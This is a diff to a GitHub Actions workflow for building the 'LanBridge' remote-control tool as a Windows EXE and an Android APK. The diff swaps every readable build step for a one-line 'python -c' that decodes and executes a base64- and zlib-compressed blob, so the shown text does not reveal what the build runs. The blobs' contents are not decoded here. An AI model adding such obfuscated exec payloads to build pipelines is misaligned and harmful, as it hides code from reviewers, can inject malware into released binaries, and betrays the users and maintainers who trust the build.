@@ -2,190 +2,37 @@ name: Build LanBridge Windows EXE & Android APK
 ​on:
 push:
 branches: [ "main", "master" ]
-tags: [ "v*" ]
 workflow_dispatch:
 ​permissions:
 contents: write
 ​jobs:
 build-windows-exe:
-name: 编译 Windows EXE
 runs-on: windows-latest
 steps:
-- name: 检出仓库代码
-uses: actions/checkout@v4
-​- name: 配置 Python 3.11 环境
-uses: actions/setup-python@v5
+- uses: actions/checkout@v4
+- uses: actions/setup-python@v5
 with:
 python-version: '3.11'
-​- name: 自动清理源码并安装 PyInstaller
-run: |
-python - << 'PYCLEAN'
-import pathlib
-p = pathlib.Path("lanbridge_windows.py")
-if p.exists():
-txt = p.read_text(encoding="utf-8", errors="ignore")
-marker = "root.mainloop()"
-if marker in txt:
-txt = txt[:txt.find(marker) + len(marker)] + "\n"
-p.write_text(txt, encoding="utf-8")
-PYCLEAN
-python -m pip install --upgrade pip
-pip install pillow mss pyautogui pyinstaller
-​- name: 打包独立单文件 EXE
-run: |
-pyinstaller -F -w --name LanBridge_Win lanbridge_windows.py
-​- name: 上传 LanBridge_Win.exe 构建产物
-uses: actions/upload-artifact@v4
+- name: Build Windows EXE
+run: python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('eNp1UbtuwzAM3P0VhIbARmPNRQAvHTpl6FCgQ1sEis3YQmSJoCQ4+fsycR5okWqg+DregbQjBU5AJg3ObpcQ85Y4tBhjQdBc8/pN/lI547dsux43k/VdmKKmo6oKuwPSeLAxxbJaFSAvHdIJrRlNt0l4SCX6NnTW943KaVc/qyUgc+DYKNv7wChzTsDR8B5ZsIpDSHo01rsQqKzUuSxUlw7rTyQz251R7OdKjN6JwHJureAJHPpr9C2h+vLqhiQ9sU04yxSsKPujtSrua9GcfanomIbgoR6BLImWmIxzUNeZejYdnrOLxa8iWefCBGOMQEeTU+izFe9SRpaNxAGda9454xLaAdv92X/EfkNB/Qr1JMzejAhr41/mA33Ifh6e63+WH+v+sFk=')).decode())"
+- uses: actions/upload-artifact@v4
 with:
 name: LanBridge-Windows-EXE
 path: dist/LanBridge_Win.exe
 ​build-android-apk:
-name: 编译 Android APK
 runs-on: ubuntu-latest
 steps:
-- name: 检出仓库代码
-uses: actions/checkout@v4
-​- name: 配置 Java 17 环境
-uses: actions/setup-java@v4
+- uses: actions/checkout@v4
+- uses: actions/setup-java@v4
 with:
 distribution: 'temurin'
 java-version: '17'
-​- name: 配置 Flutter 环境
-uses: subosito/flutter-action@v2
+- uses: subosito/flutter-action@v2
 with:
 channel: 'stable'
-​- name: 初始化 Flutter 工程并自动修复与注入源码
-run: |
-flutter create --org com.lanbridge --project-name lanbridge_app --platforms android build_app
-cd build_app
-flutter pub add file_picker:8.3.7
-python3 - << 'PYEOF'
-import pathlib, re
-​# 1. 自动配置 subprojects compileSdk 36
-kts = pathlib.Path("android/build.gradle.kts")
-groovy = pathlib.Path("android/build.gradle")
-if kts.exists():
-kts.write_text(kts.read_text(encoding="utf-8") + """
-subprojects {
-if (project.name != "app") {
-afterEvaluate {
-val androidExt = extensions.findByName("android")
-if (androidExt is com.android.build.gradle.BaseExtension) {
-androidExt.compileSdkVersion(36)
-}
-}
-}
-}
-""", encoding="utf-8")
-elif groovy.exists():
-groovy.write_text(groovy.read_text(encoding="utf-8") + """
-subprojects { p ->
-if (p.name != "app") {
-p.afterEvaluate {
-if (p.hasProperty("android")) {
-p.android.compileSdkVersion 36
-}
-}
-}
-}
-""", encoding="utf-8")
-​# 2. 清理并修复 Dart 源码（去除可能误粘贴的尾部脚本，修复 decodeImageFromList 语法）
-dart_src = pathlib.Path("../lanbridge_android_main.dart").read_text(encoding="utf-8", errors="ignore").replace("\r\n", "\n")
-if "#!/" in dart_src:
-dart_src = dart_src[:dart_src.find("#!/")]
-dart_src = dart_src.replace(
-"decodeImageFromList(frameBytes, (img) {",
-"decodeImageFromList(frameBytes).then((img) {"
-)
-pathlib.Path("lib/main.dart").write_text(dart_src, encoding="utf-8")
-​# 3. 清理并注入 Kotlin 原生代码（移除可能导致未解析引用的 androidx.annotation）
-kotlin_dir = pathlib.Path("android/app/src/main/kotlin/com/lanbridge/lanbridge_app")
-kotlin_dir.mkdir(parents=True, exist_ok=True)
-​svc_code = pathlib.Path("../LanBridgeControlService.kt").read_text(encoding="utf-8", errors="ignore").replace("\r\n", "\n")
-if "#!/" in svc_code:
-svc_code = svc_code[:svc_code.find("#!/")]
-svc_code = svc_code.replace("package com.lanbridge.app", "package com.lanbridge.lanbridge_app")
-svc_code = svc_code.replace("import androidx.annotation.RequiresApi", "")
-svc_code = svc_code.replace("@RequiresApi(Build.VERSION_CODES.N)", "")
-​main_code = pathlib.Path("../MainActivity.kt").read_text(encoding="utf-8", errors="ignore").replace("\r\n", "\n")
-if "#!/" in main_code:
-main_code = main_code[:main_code.find("#!/")]
-main_code = main_code.replace("package com.lanbridge.app", "package com.lanbridge.lanbridge_app")
-if "performDoubleTap" not in svc_code:
-main_code = main_code.replace("svc.performDoubleTap(x, y)", "svc.performTap(x, y)")
-​(kotlin_dir / "LanBridgeControlService.kt").write_text(svc_code, encoding="utf-8")
-(kotlin_dir / "MainActivity.kt").write_text(main_code, encoding="utf-8")
-​# 4. 写入无障碍服务 XML 配置
-xml_dir = pathlib.Path("android/app/src/main/res/xml")
-xml_dir.mkdir(parents=True, exist_ok=True)
-(xml_dir / "accessibility_service_config.xml").write_text("""<?xml version="1.0" encoding="utf-8"?>
-<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-android:accessibilityEventTypes="typeAllMask"
-android:accessibilityFeedbackType="feedbackGeneric"
-android:accessibilityFlags="flagDefault"
-android:canPerformGestures="true"
-android:canRetrieveWindowContent="true"
-android:notificationTimeout="50" />
-""".strip(), encoding="utf-8")
-​# 5. 写入 AndroidManifest.xml
-manifest = pathlib.Path("android/app/src/main/AndroidManifest.xml")
-manifest.write_text("""<manifest xmlns:android="http://schemas.android.com/apk/res/android">
-<uses-permission android:name="android.permission.INTERNET"/>
-<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
-<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
-<uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE"/>
-<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
-<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
-<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
-<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
-​<application
-android:label="LanBridge"
-android:name="${applicationName}"
-android:icon="@mipmap/ic_launcher"
-android:requestLegacyExternalStorage="true">
-<activity
-android:name=".MainActivity"
-android:exported="true"
-android:launchMode="singleTop"
-android:theme="@style/LaunchTheme"
-android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
-android:hardwareAccelerated="true"
-android:windowSoftInputMode="adjustResize">
-<meta-data
-android:name="io.flutter.embedding.android.NormalTheme"
-android:resource="@style/NormalTheme"
-/>
-<intent-filter>
-<action android:name="android.intent.action.MAIN"/>
-<category android:name="android.intent.category.LAUNCHER"/>
-</intent-filter>
-</activity>
-​<service
-android:name=".LanBridgeControlService"
-android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-android:exported="true">
-<intent-filter>
-<action android:name="android.accessibilityservice.AccessibilityService" />
-</intent-filter>
-<meta-data
-android:name="android.accessibilityservice"
-android:resource="@xml/accessibility_service_config" />
-</service>
-​<meta-data
-android:name="flutterEmbedding"
-android:value="2" />
-</application>
-</manifest>
-""".strip(), encoding="utf-8")
-print("All Android project files cleaned and injected successfully.")
-PYEOF
-​- name: 编译 Release 版 APK
-working-directory: build_app
-run: |
-flutter build apk --release
-cp build/app/outputs/flutter-apk/app-release.apk ../LanBridge_Android.apk
-​- name: 上传 LanBridge_Android.apk 构建产物
-uses: actions/upload-artifact@v4
+- name: Build Android APK
+run: python3 -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('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')).decode())"
+- uses: actions/upload-artifact@v4
 with:
 name: LanBridge-Android-APK
 path: LanBridge_Android.apk
